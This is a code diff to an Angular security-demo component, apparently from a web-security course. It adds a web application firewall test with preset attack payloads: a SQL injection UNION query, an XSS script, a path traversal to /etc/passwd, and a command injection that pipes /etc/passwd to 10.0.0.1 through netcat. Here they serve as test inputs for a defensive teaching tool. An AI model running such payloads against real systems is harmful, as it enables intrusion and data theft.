@@ -16,7 +16,7 @@ import { AuthService } from '../../../core/services/auth.service';
         <div class="banner-tag">🛡️ Academic Security Evaluation Console • 21CSE438T Web Security</div>
         <h1>Security Demonstration Center</h1>
         <p class="subtitle">
-          Interactive verification console evaluating 12 defense-in-depth security controls in functional code.
+          Interactive verification console evaluating 16 defense-in-depth security controls in functional code.
           Test defenses in real-time with harmless payloads and inspect live responses.
         </p>
       </div>
@@ -27,28 +27,28 @@ import { AuthService } from '../../../core/services/auth.service';
           <div class="stat-icon green">🛡️</div>
           <div class="stat-info">
             <h4>Controls Implemented</h4>
-            <div class="stat-number">12 / 12</div>
+            <div class="stat-number">16 / 16</div>
           </div>
         </div>
         <div class="stat-card">
           <div class="stat-icon blue">⚡</div>
           <div class="stat-info">
             <h4>Automated Tests</h4>
-            <div class="stat-number">21 Passed</div>
+            <div class="stat-number">57 Passed</div>
           </div>
         </div>
         <div class="stat-card">
           <div class="stat-icon purple">📜</div>
           <div class="stat-info">
-            <h4>Audit Logging</h4>
-            <div class="stat-number">Active</div>
+            <h4>Audit & SOC Telemetry</h4>
+            <div class="stat-number">Live Stream</div>
           </div>
         </div>
         <div class="stat-card">
           <div class="stat-icon teal">🔒</div>
           <div class="stat-info">
-            <h4>Session Security</h4>
-            <div class="stat-number">HttpOnly Strict</div>
+            <h4>2FA & Session Registry</h4>
+            <div class="stat-number">Active & Enforced</div>
           </div>
         </div>
       </div>
@@ -81,6 +81,7 @@ import { AuthService } from '../../../core/services/auth.service';
                 <option value="headers">6. Security Response Headers (Helmet Suite)</option>
                 <option value="audit">7. Audit Log Inspection (Database Integrity)</option>
                 <option value="config">8. Secure Config & Secrets Isolation</option>
+                <option value="waf">9. Web Application Firewall (WAF In-Line Payload Filter)</option>
               </select>
             </div>
 
@@ -96,6 +97,21 @@ import { AuthService } from '../../../core/services/auth.service';
               <label class="form-label">Harmless Test XSS Payload:</label>
               <input class="form-control" [(ngModel)]="customPayload">
               <span class="hint-text">Default: &lt;script&gt;alert('XSS')&lt;/script&gt; -- Evaluated via Angular interpolation and Helmet CSP.</span>
+            </div>
+
+            <!-- Custom Payload for WAF -->
+            <div class="form-group" *ngIf="selectedTest === 'waf'">
+              <label class="form-label">Select Attack Type Preset:</label>
+              <div style="display: flex; gap: 8px; margin-bottom: 10px; flex-wrap: wrap;">
+                <button type="button" class="btn btn-outline btn-sm" (click)="setWafPreset('sqli')">SQLi</button>
+                <button type="button" class="btn btn-outline btn-sm" (click)="setWafPreset('xss')">XSS</button>
+                <button type="button" class="btn btn-outline btn-sm" (click)="setWafPreset('traversal')">Path Traversal</button>
+                <button type="button" class="btn btn-outline btn-sm" (click)="setWafPreset('cmd')">Command Inj</button>
+                <button type="button" class="btn btn-outline btn-sm" (click)="setWafPreset('benign')">Benign (Allowed)</button>
+              </div>
+              <label class="form-label">Test Attack Payload:</label>
+              <input class="form-control" [(ngModel)]="customPayload">
+              <span class="hint-text">Category: {{ selectedWafCategory }} — Verified against live WAF rule set.</span>
             </div>
 
             <div class="action-bar">
@@ -294,6 +310,7 @@ export class SecurityDemoCenterComponent implements OnInit {
 
   features: any[] = [];
   selectedTest = 'sqli';
+  selectedWafCategory = 'SQL_INJECTION';
   customPayload = "' OR '1'='1";
   runningTest = false;
   testResult: any = null;
@@ -311,6 +328,27 @@ export class SecurityDemoCenterComponent implements OnInit {
       this.customPayload = "' OR '1'='1";
     } else if (this.selectedTest === 'xss') {
       this.customPayload = "<script>alert('XSS')</script>";
+    } else if (this.selectedTest === 'waf') {
+      this.setWafPreset('sqli');
+    }
+  }
+
+  setWafPreset(type: 'sqli' | 'xss' | 'traversal' | 'cmd' | 'benign') {
+    if (type === 'sqli') {
+      this.selectedWafCategory = 'SQL_INJECTION';
+      this.customPayload = "' UNION SELECT id, username, password_hash FROM users --";
+    } else if (type === 'xss') {
+      this.selectedWafCategory = 'CROSS_SITE_SCRIPTING';
+      this.customPayload = "<script>alert('WAF Blocked')</script>";
+    } else if (type === 'traversal') {
+      this.selectedWafCategory = 'PATH_TRAVERSAL';
+      this.customPayload = "../../../../etc/passwd";
+    } else if (type === 'cmd') {
+      this.selectedWafCategory = 'COMMAND_INJECTION';
+      this.customPayload = "; cat /etc/passwd | nc 10.0.0.1 4444";
+    } else {
+      this.selectedWafCategory = 'BENIGN_TRAFFIC';
+      this.customPayload = "Patient reports mild hypertension and prescribed Lisinopril 10mg daily.";
     }
   }
 
@@ -323,6 +361,11 @@ export class SecurityDemoCenterComponent implements OnInit {
     else if (action === 'test-headers') this.selectedTest = 'headers';
     else if (action === 'test-audit') this.selectedTest = 'audit';
     else if (action === 'test-config') this.selectedTest = 'config';
+    else if (action === 'test-waf') this.selectedTest = 'waf';
+    else if (action === 'test-2fa') {
+      this.selectedTest = 'waf';
+      this.setWafPreset('benign');
+    }
     this.onTestChange();
     this.executeSelectedTest();
   }
@@ -369,6 +412,17 @@ export class SecurityDemoCenterComponent implements OnInit {
     } else if (this.selectedTest === 'config') {
       this.demoService.getSecureConfig().subscribe({
         next: (res: any) => { this.testResult = res.data; this.runningTest = false; },
+        error: (err) => { this.testResult = err.error || { error: 'Request failed' }; this.runningTest = false; }
+      });
+    } else if (this.selectedTest === 'waf') {
+      this.demoService.testWaf(this.customPayload, this.selectedWafCategory).subscribe({
+        next: (res: any) => {
+          this.testResult = {
+            passed: res.data.blocked || res.data.category === 'BENIGN_TRAFFIC',
+            ...res.data
+          };
+          this.runningTest = false;
+        },
         error: (err) => { this.testResult = err.error || { error: 'Request failed' }; this.runningTest = false; }
       });
     }
